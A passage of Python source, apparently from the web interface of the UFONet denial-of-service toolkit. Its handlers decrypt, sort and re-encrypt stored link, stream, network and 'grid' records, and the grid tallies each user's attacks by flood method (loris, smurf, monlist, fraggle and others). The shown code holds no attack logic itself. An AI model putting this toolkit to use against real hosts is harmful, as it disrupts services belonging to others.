                    self.encrypt(link_key, link_topic)
                    if self.encryptedtext:
                        link_topic = self.encryptedtext
                    else:
                        link_topic = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    l = str(link_creation) + links_msg_sep + str(link_url) + links_msg_sep + str(link_topic)
                    f.write(l + os.linesep)
                f.close()
            except:
                pass
        if page == "/cmd_link_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_link_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_stream_filter":
            try:
                stream_filter = pGet["filter"]
                stream_key = pGet["key"]
            except:
                stream_filter = "creation"
                stream_key = str(self.crypto_key)
            self.pages["/cmd_stream_filter"] = "<pre>Ordering streams by: "+stream_filter+"</pre>"
            nodec_text = "KEY?"
            try:
                streams_items=[]
                with open(self.streams_file) as f:
                    ls = f.read().splitlines()
                f.close()
                f = open(self.streams_file,"w")
                for j in ls:
                    if streams_msg_sep in j:
                        m = j.split(streams_msg_sep)
                        stream_creation = m[0] # creation date
                        self.decrypt(stream_key, stream_creation)
                        if self.decryptedtext:
                            stream_creation = self.decryptedtext
                        else:
                            stream_creation = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        stream_url = m[1] # url
                        self.decrypt(stream_key, stream_url)
                        if self.decryptedtext:
                            stream_url = self.decryptedtext
                            if stream_url.startswith("www."):
                                stream_url = stream_url.replace("www.","")
                        else:
                            stream_url = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        stream_topic = m[2] # topic
                        self.decrypt(stream_key, stream_topic)
                        if self.decryptedtext:
                            stream_topic = self.decryptedtext
                        else:
                            stream_topic = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        stream_creation = strptime(stream_creation, "%d-%m-%Y %H:%M:%S")
                        streams_items.append([stream_creation,stream_url,stream_topic])
                if stream_filter == "creation":
                    streams_items=sorted(streams_items,key=lambda x:x[0]) # sorted by creation
                elif stream_filter == "url": 
                    streams_items=sorted(streams_items,key=lambda x:x[1]) # sorted by url
                elif stream_filter == "topic": 
                    streams_items=sorted(streams_items,key=lambda x:x[2]) # sorted by topic
                else:
                    streams_items=sorted(streams_items,key=lambda x:x[0]) # sorted by creation
                for i in streams_items:
                    stream_creation = i[0]
                    stream_creation = strftime("%d-%m-%Y %H:%M:%S", stream_creation)
                    self.encrypt(stream_key, stream_creation)
                    if self.encryptedtext:
                        stream_creation = self.encryptedtext
                    else:
                        stream_creation = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream_url = str(i[1])
                    self.encrypt(stream_key, stream_url)
                    if self.encryptedtext:
                        stream_url = self.encryptedtext
                    else:
                        stream_url = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream_topic = str(i[2])
                    self.encrypt(stream_key, stream_topic)
                    if self.encryptedtext:
                        stream_topic = self.encryptedtext
                    else:
                        stream_topic = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    l = str(stream_creation) + streams_msg_sep + str(stream_url) + streams_msg_sep + str(stream_topic)
                    f.write(l + os.linesep)
                f.close()
            except:
                pass
        if page == "/cmd_stream_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_stream_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_globalnet_filter":
            try:
                globalnet_filter = pGet["filter"]
                globalnet_key = pGet["key"]
            except:
                globalnet_filter = "owner"
                globalnet_key = str(self.crypto_key)
            self.pages["/cmd_globalnet_filter"] = "<pre>Ordering Global.Net by: "+globalnet_filter+"</pre>"
            nodec_text = "KEY?"
            try:
                globalnet_items=[]
                with open(self.globalnet_file) as f:
                    ls = f.read().splitlines()
                f.close()
                f = open(self.globalnet_file,"w")
                for j in ls:
                    if globalnet_msg_sep in j:
                        m = j.split(globalnet_msg_sep)
                        globalnet_owner = m[0] # owner
                        self.decrypt(globalnet_key, globalnet_owner)
                        if self.decryptedtext:
                            globalnet_owner = self.decryptedtext
                        else:
                            globalnet_owner = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_comment = m[1] # comment
                        self.decrypt(globalnet_key, globalnet_comment)
                        if self.decryptedtext:
                            globalnet_comment = self.decryptedtext
                        else:
                            globalnet_comment = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_warp = m[2] # warp
                        self.decrypt(globalnet_key, globalnet_warp)
                        if self.decryptedtext:
                            globalnet_warp = self.decryptedtext
                        else:
                            globalnet_warp = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_ip = m[3] # ip
                        self.decrypt(globalnet_key, globalnet_ip)
                        if self.decryptedtext:
                            globalnet_ip = self.decryptedtext
                        else:
                            globalnet_ip = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        globalnet_items.append([globalnet_owner,globalnet_comment,globalnet_warp,globalnet_ip])
                if globalnet_filter == "owner":
                    globalnet_items=sorted(globalnet_items,key=lambda x:x[0]) # sorted by owner
                elif globalnet_filter == "comment": 
                    globalnet_items=sorted(globalnet_items,key=lambda x:x[1]) # sorted by comment
                elif globalnet_filter == "warp": 
                    globalnet_items=sorted(globalnet_items,key=lambda x:x[2]) # sorted by warp
                elif globalnet_filter == "ip": 
                    globalnet_items=sorted(globalnet_items,key=lambda x:x[3]) # sorted by ip
                else:
                    globalnet_items=sorted(globalnet_items,key=lambda x:x[0]) # sorted by owner
                for i in globalnet_items:
                    globalnet_owner = str(i[0])
                    self.encrypt(globalnet_key, globalnet_owner)
                    if self.encryptedtext:
                        globalnet_owner = self.encryptedtext
                    else:
                        globalnet_owner = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer
                    globalnet_comment = str(i[1])
                    self.encrypt(globalnet_key, globalnet_comment)
                    if self.encryptedtext:
                        globalnet_comment = self.encryptedtext
                    else:
                        globalnet_comment = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer
                    globalnet_warp = str(i[2])
                    self.encrypt(globalnet_key, globalnet_warp)
                    if self.encryptedtext:
                        globalnet_warp = self.encryptedtext
                    else:
                        globalnet_warp = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    globalnet_ip = str(i[3])
                    self.encrypt(globalnet_key, globalnet_ip)
                    if self.encryptedtext:
                        globalnet_ip = self.encryptedtext
                    else:
                        globalnet_ip = nodec_text
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    l = str(globalnet_owner) + globalnet_msg_sep + str(globalnet_comment) + globalnet_msg_sep + str(globalnet_warp) + globalnet_msg_sep + str(globalnet_ip)
                    f.write(l + os.linesep)
                f.close()
            except:
                pass
        if page == "/cmd_globalnet_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_globalnet_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_grid_filter":
            try:
                grid_filter = pGet["filter"]
                grid_key = pGet["key"]
            except:
                grid_filter = "missions" # default grid order by
                grid_key = str(self.crypto_key)
            self.pages["/cmd_grid_filter"] = "<pre>Ordering grid by: "+grid_filter+"</pre>"
            nodec_text = "KEY?"
            nodec_num = 0
            try:
                grid_items=[]
                with open(self.grid_file) as f:
                    ls = f.read().splitlines() 
                f.close()
                f = open(self.grid_file,"w")
                for j in ls:
                    if grid_msg_sep in j:
                        version = j.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1|13->1.2)
                        m = j.split(grid_msg_sep)
                        grid_nickname = m[0] # nickname
                        self.decrypt(grid_key, grid_nickname)
                        if self.decryptedtext:
                            grid_nickname = str(self.decryptedtext)
                        else:
                            grid_nickname = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_ranking = m[1] # ranking
                        self.decrypt(grid_key, grid_ranking)
                        if self.decryptedtext:
                            try:
                                grid_ranking = int(self.decryptedtext)
                            except:
                                grid_ranking = nodec_num
                        else:
                            grid_ranking = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_totalchargo = m[2] # total chargo
                        self.decrypt(grid_key, grid_totalchargo)
                        if self.decryptedtext:
                            try:
                                grid_totalchargo = int(self.decryptedtext)
                            except:
                                grid_totalchargo = nodec_num
                        else:
                            grid_totalchargo = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_dorking = m[3] # dorking
                        self.decrypt(grid_key, grid_dorking)
                        if self.decryptedtext:
                            try:
                                grid_dorking = int(self.decryptedtext)
                            except:
                                grid_dorking = nodec_num
                        else:
                            grid_dorking = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_transferred = m[4] # transferred
                        self.decrypt(grid_key, grid_transferred)
                        if self.decryptedtext:
                            try:
                                grid_transferred = int(self.decryptedtext)
                            except:
                                grid_transferred = nodec_num
                        else:
                            grid_transferred = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_maxchargo = m[5] # maxchargo
                        self.decrypt(grid_key, grid_maxchargo)
                        if self.decryptedtext:
                            try:
                                grid_maxchargo = int(self.decryptedtext)
                            except:
                                grid_maxchargo = nodec_num
                        else:
                            grid_maxchargo = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_missions = m[6] # missions
                        self.decrypt(grid_key, grid_missions)
                        if self.decryptedtext:
                            try:
                                grid_missions = int(self.decryptedtext)
                            except:
                                grid_missions = nodec_num
                        else:
                            grid_missions = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_attacks = m[7] # attacks
                        self.decrypt(grid_key, grid_attacks)
                        if self.decryptedtext:
                            try:
                                grid_attacks = int(self.decryptedtext)
                            except:
                                grid_attacks = nodec_num
                        else:
                            grid_attacks = nodec_num
                        self.decryptedtext = "" # clean decryptedtext buffer
                        grid_loic = m[8] # loic
                        self.decrypt(grid_key, grid_loic)
                        if self.decryptedtext:
                            try:
                                grid_loic = int(self.decryptedtext)
                            except:
                                grid_loic = nodec_num
                        else:
                            grid_loic = nodec_num
                        if version > 17 or version == 17 or version == 16 or version == 15 or version == 12 or version == 11:
                            grid_loris = m[9] # loris
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                try:
                                    grid_loris = int(self.decryptedtext)
                                except:
                                    grid_loris = nodec_num
                            else:
                                grid_loris = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        else:
                            grid_loris = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not loris present
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                try:
                                    grid_loris = int(self.decryptedtext)
                                except:
                                    grid_loris = nodec_num
                            else:
                                grid_loris = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17 or version == 17 or version == 16 or version == 15 or version == 12:
                            grid_ufosyn = m[10] # ufosyn
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                try:
                                    grid_ufosyn = int(self.decryptedtext)
                                except:
                                    grid_ufosyn = nodec_num
                            else:
                                grid_ufosyn = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        else:
                            grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufosyn present
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                try:
                                    grid_ufosyn = int(self.decryptedtext)
                                except:
                                    grid_ufosyn = nodec_num
                            else:
                                grid_ufosyn = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17 or version == 17 or version == 16 or version == 15: 
                            grid_spray = m[11] # spray
                            self.decrypt(grid_key, grid_spray)
                            if self.decryptedtext:
                                try:
                                    grid_spray = int(self.decryptedtext)
                                except:
                                    grid_spray = nodec_num
                            else:
                                grid_spray = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        else:
                            grid_spray = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not spray present
                            self.decrypt(grid_key, grid_spray)
                            if self.decryptedtext:
                                try:
                                    grid_spray = int(self.decryptedtext)
                                except:
                                    grid_spray = nodec_num
                            else:
                                grid_spray = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17 or version == 17 or version == 16 or version == 15:
                            grid_smurf = m[12] # smurf
                            self.decrypt(grid_key, grid_smurf)
                            if self.decryptedtext:
                                try:
                                    grid_smurf = int(self.decryptedtext)
                                except:
                                    grid_smurf = nodec_num
                            else:
                                grid_smurf = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        else:
                            grid_smurf = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not smurf present
                            self.decrypt(grid_key, grid_smurf)
                            if self.decryptedtext:
                                try:
                                    grid_smurf = int(self.decryptedtext)
                                except:
                                    grid_smurf = nodec_num
                            else:
                                grid_smurf = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17 or version == 17 or version == 16 or version == 15:   
                            grid_xmas = m[13] # xmas
                            self.decrypt(grid_key, grid_xmas)
                            if self.decryptedtext:
                                try:
                                    grid_xmas = int(self.decryptedtext)
                                except:
                                    grid_xmas = nodec_num
                            else:
                                grid_xmas = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        else:
                            grid_xmas = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not xmas present
                            self.decrypt(grid_key, grid_xmas)
                            if self.decryptedtext:
                                try:
                                    grid_xmas = int(self.decryptedtext)
                                except:
                                    grid_xmas = nodec_num
                            else:
                                grid_xmas = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17 or version == 17 or version == 16:   
                            grid_nuke = m[14] # nuke
                            self.decrypt(grid_key, grid_nuke)
                            if self.decryptedtext:
                                try:
                                    grid_nuke = int(self.decryptedtext)
                                except:
                                    grid_nuke = nodec_num
                            else:
                                grid_nuke = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        else:
                            grid_nuke = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not nuke present
                            self.decrypt(grid_key, grid_nuke)
                            if self.decryptedtext:
                                try:
                                    grid_nuke = int(self.decryptedtext)
                                except:
                                    grid_nuke = nodec_num
                            else:
                                grid_nuke = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17 or version == 17: 
                            grid_tachyon = m[15] # tachyon
                            self.decrypt(grid_key, grid_tachyon)
                            if self.decryptedtext:
                                try:
                                    grid_tachyon = int(self.decryptedtext)
                                except:
                                    grid_tachyon = nodec_num
                            else:
                                grid_tachyon = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer  
                        else:
                            grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not tachyon present
                            self.decrypt(grid_key, grid_tachyon)
                            if self.decryptedtext: 
                                try:
                                    grid_tachyon = int(self.decryptedtext)
                                except:
                                    grid_tachyon = nodec_num
                            else:
                                grid_tachyon = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17: # current version = 26
                            grid_monlist = m[16] # monlist
                            self.decrypt(grid_key, grid_monlist)
                            if self.decryptedtext:
                                try:
                                    grid_monlist = int(self.decryptedtext)
                                except:
                                    grid_monlist = nodec_num
                            else:
                                grid_monlist = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer 
                            grid_fraggle = m[17] # fraggle
                            self.decrypt(grid_key, grid_fraggle)
                            if self.decryptedtext:
                                try:
                                    grid_fraggle = int(self.decryptedtext)
                                except:
                                    grid_fraggle = nodec_num
                            else:
                                grid_fraggle = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer 
                            grid_sniper = m[18] # sniper
                            self.decrypt(grid_key, grid_sniper)
                            if self.decryptedtext:
                                try:
                                    grid_sniper = int(self.decryptedtext)
                                except:
                                    grid_sniper = nodec_num
                            else:
                                grid_sniper = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer 
                            grid_ufoack = m[19] # ufoack
                            self.decrypt(grid_key, grid_ufoack)
                            if self.decryptedtext:
                                try:
                                    grid_ufoack = int(self.decryptedtext)
                                except:
                                    grid_ufoack = nodec_num
                            else:
                                grid_ufoack = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_uforst = m[20] # uforst
                            self.decrypt(grid_key, grid_uforst)
                            if self.decryptedtext:
                                try:
                                    grid_uforst = int(self.decryptedtext)
                                except:
                                    grid_uforst = nodec_num
                            else:
                                grid_uforst = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer 
                            grid_droper = m[21] # droper
                            self.decrypt(grid_key, grid_droper)
                            if self.decryptedtext:
                                try:
                                    grid_droper = int(self.decryptedtext)
                                except:
                                    grid_droper = nodec_num
                            else:
                                grid_droper = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_overlap = m[22] # overlap
                            self.decrypt(grid_key, grid_overlap)
                            if self.decryptedtext:
                                try:
                                    grid_overlap = int(self.decryptedtext)
                                except:
                                    grid_overlap = nodec_num
                            else:
                                grid_overlap = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer 
                            grid_pinger = m[23] # pinger
                            self.decrypt(grid_key, grid_pinger)
                            if self.decryptedtext:
                                try:
                                    grid_pinger = int(self.decryptedtext)
                                except:
                                    grid_pinger = nodec_num
                            else:
                                grid_pinger = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_ufoudp = m[24] # ufoudp
                            self.decrypt(grid_key, grid_ufoudp)
                            if self.decryptedtext:
                                try:
                                    grid_ufoudp = int(self.decryptedtext)
                                except:
                                    grid_ufoudp = nodec_num
                            else:
                                grid_ufoudp = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer 
                        else:
                            grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not monlist present
                            self.decrypt(grid_key, grid_monlist)
                            if self.decryptedtext:
                                try:
                                    grid_monlist = int(self.decryptedtext)
                                except:
                                    grid_monlist = nodec_num
                            else:
                                grid_monlist = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not fraggle present
                            self.decrypt(grid_key, grid_fraggle)
                            if self.decryptedtext:
                                try:
                                    grid_fraggle = int(self.decryptedtext)
                                except:
                                    grid_fraggle = nodec_num
                            else:
                                grid_fraggle = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not sniper present
                            self.decrypt(grid_key, grid_sniper)
                            if self.decryptedtext:
                                try:
                                    grid_sniper = int(self.decryptedtext)
                                except:
                                    grid_sniper = nodec_num
                            else:
                                grid_sniper = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufoack present
                            self.decrypt(grid_key, grid_ufoack)
                            if self.decryptedtext:
                                try:
                                    grid_ufoack = int(self.decryptedtext)
                                except:
                                    grid_ufoack = nodec_num
                            else:
                                grid_ufoack = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not uforst present
                            self.decrypt(grid_key, grid_uforst)
                            if self.decryptedtext:
                                try:
                                    grid_uforst = int(self.decryptedtext)
                                except:
                                    grid_uforst = nodec_num
                            else:
                                grid_uforst = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not droper present
                            self.decrypt(grid_key, grid_droper)
                            if self.decryptedtext:
                                try:
                                    grid_droper = int(self.decryptedtext)
                                except:
                                    grid_droper = nodec_num
                            else:
                                grid_droper = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not overlap present
                            self.decrypt(grid_key, grid_overlap)
                            if self.decryptedtext:
                                try:
                                    grid_overlap = int(self.decryptedtext)
                                except:
                                    grid_overlap = nodec_num
                            else:
                                grid_overlap = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not pinger present
                            self.decrypt(grid_key, grid_pinger)
                            if self.decryptedtext:
                                try:
                                    grid_pinger = int(self.decryptedtext)
                                except:
                                    grid_pinger = nodec_num
                            else:
                                grid_pinger = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufoudp present
                            self.decrypt(grid_key, grid_ufoudp)
                            if self.decryptedtext:
                                try:
                                    grid_ufoudp = int(self.decryptedtext)
                                except:
                                    grid_ufoudp = nodec_num
                            else:
                                grid_ufoudp = nodec_num
                            self.decryptedtext = "" # clean decryptedtext buffer
                        if version > 17:
                            grid_contact = m[25] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[26] # id
                        elif version == 17:
                            grid_contact = m[16] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[17] # id 
                        elif version == 16:
                            grid_contact = m[15] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[16] # id 
                        elif version == 15:
                            grid_contact = m[14] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[15] # id 
                        elif version == 12:
                            grid_contact = m[11] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[12] # id     
                        elif version == 11:
                            grid_contact = m[10] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[11] # id 
                        elif version == 10:
                            grid_contact = m[9] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer      
                            grid_id = m[10] # id 
                        else: 
                            grid_contact = nodec_text
                            grid_id = '6666666666666666666666666666666666666' # fake id
                        grid_items.append([str(grid_nickname),int(grid_ranking),int(grid_totalchargo),int(grid_dorking),int(grid_transferred),int(grid_maxchargo),int(grid_missions),int(grid_attacks),int(grid_loic),int(grid_loris),int(grid_ufosyn),int(grid_spray),int(grid_smurf),int(grid_xmas),int(grid_nuke),int(grid_tachyon),int(grid_monlist),int(grid_fraggle),int(grid_sniper),int(grid_ufoack),int(grid_uforst),int(grid_droper),int(grid_overlap),int(grid_pinger),int(grid_ufoudp),str(grid_contact),str(grid_id)])
                if grid_filter == "nickname":
                    grid_items=sorted(grid_items,key=lambda x:x[0]) # sorted by nickname
                elif grid_filter == "ranking": 
                    grid_items=sorted(grid_items,key=lambda x:x[1]) # sorted by ranking
                elif grid_filter == "chargo":
                    grid_items=sorted(grid_items,key=lambda x:x[2]) # sorted by totalchargo 
                elif grid_filter == "dorking":
                    grid_items=sorted(grid_items,key=lambda x:x[3]) # sorted by dorking
                elif grid_filter == "transferred":
                    grid_items=sorted(grid_items,key=lambda x:x[4]) # sorted by transferred
                elif grid_filter == "maxchargo":
                    grid_items=sorted(grid_items,key=lambda x:x[5]) # sorted by maxchargo
                elif grid_filter == "missions":
                    grid_items=sorted(grid_items,key=lambda x:x[6]) # sorted by missions
                elif grid_filter == "attacks":
                    grid_items=sorted(grid_items,key=lambda x:x[7]) # sorted by attacks
                elif grid_filter == "loic":
                    grid_items=sorted(grid_items,key=lambda x:x[8]) # sorted by loic
                elif grid_filter == "loris":
                    grid_items=sorted(grid_items,key=lambda x:x[9]) # sorted by loris
                elif grid_filter == "ufosyn":
                    grid_items=sorted(grid_items,key=lambda x:x[10]) # sorted by ufosyn
                elif grid_filter == "spray":
                    grid_items=sorted(grid_items,key=lambda x:x[11]) # sorted by spray
                elif grid_filter == "smurf":
                    grid_items=sorted(grid_items,key=lambda x:x[12]) # sorted by smurf
                elif grid_filter == "xmas":
                    grid_items=sorted(grid_items,key=lambda x:x[13]) # sorted by xmas
                elif grid_filter == "nuke":
                    grid_items=sorted(grid_items,key=lambda x:x[14]) # sorted by nuke
                elif grid_filter == "tachyon":
                    grid_items=sorted(grid_items,key=lambda x:x[15]) # sorted by tachyon
                elif grid_filter == "monlist":
                    grid_items=sorted(grid_items,key=lambda x:x[16]) # sorted by monlist
                elif grid_filter == "fraggle":
                    grid_items=sorted(grid_items,key=lambda x:x[17]) # sorted by fraggle
                elif grid_filter == "sniper":
                    grid_items=sorted(grid_items,key=lambda x:x[18]) # sorted by sniper
                elif grid_filter == "ufoack":
                    grid_items=sorted(grid_items,key=lambda x:x[19]) # sorted by ufoack
                elif grid_filter == "uforst":
                    grid_items=sorted(grid_items,key=lambda x:x[20]) # sorted by uforst
                elif grid_filter == "droper":
                    grid_items=sorted(grid_items,key=lambda x:x[21]) # sorted by droper
                elif grid_filter == "overlap":
                    grid_items=sorted(grid_items,key=lambda x:x[22]) # sorted by overlap
                elif grid_filter == "pinger":
                    grid_items=sorted(grid_items,key=lambda x:x[23]) # sorted by pinger
                elif grid_filter == "ufoudp":
                    grid_items=sorted(grid_items,key=lambda x:x[24]) # sorted by ufoudp
                elif grid_filter == "contact":
                    grid_items=sorted(grid_items,key=lambda x:x[25]) # sorted by contact
                else:
                    grid_items=sorted(grid_items,key=lambda x:x[6]) # sorted by missions (default)
                for i in grid_items:
                    grid_nickname = str(i[0])
                    self.encrypt(grid_key, grid_nickname)
                    if self.encryptedtext:
                        grid_nickname = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_ranking = str(i[1])
                    self.encrypt(grid_key, grid_ranking)
                    if self.encryptedtext:
                        grid_ranking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_totalchargo = str(i[2])
                    self.encrypt(grid_key, grid_totalchargo)
                    if self.encryptedtext:
                        grid_totalchargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_dorking = str(i[3])
                    self.encrypt(grid_key, grid_dorking)
                    if self.encryptedtext:
                        grid_dorking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_transferred = str(i[4])
                    self.encrypt(grid_key, grid_transferred)
                    if self.encryptedtext:
                        grid_transferred = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_maxchargo = str(i[5])
                    self.encrypt(grid_key, grid_maxchargo)
                    if self.encryptedtext:
                        grid_maxchargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_missions = str(i[6])
                    self.encrypt(grid_key, grid_missions)
                    if self.encryptedtext:
                        grid_missions = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_attacks = str(i[7])
                    self.encrypt(grid_key, grid_attacks)
                    if self.encryptedtext:
                        grid_attacks = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_loic = str(i[8])
                    self.encrypt(grid_key, grid_loic)
                    if self.encryptedtext:
                        grid_loic = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_loris = str(i[9])
                    self.encrypt(grid_key, grid_loris)
                    if self.encryptedtext:
                        grid_loris = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_ufosyn = str(i[10])
                    self.encrypt(grid_key, grid_ufosyn)
                    if self.encryptedtext:
                        grid_ufosyn = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_spray = str(i[11])
                    self.encrypt(grid_key, grid_spray)
                    if self.encryptedtext:
                        grid_spray = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_smurf = str(i[12])
                    self.encrypt(grid_key, grid_smurf)
                    if self.encryptedtext:
                        grid_smurf = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_xmas = str(i[13])
                    self.encrypt(grid_key, grid_xmas)
                    if self.encryptedtext:
                        grid_xmas = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_nuke = str(i[14])
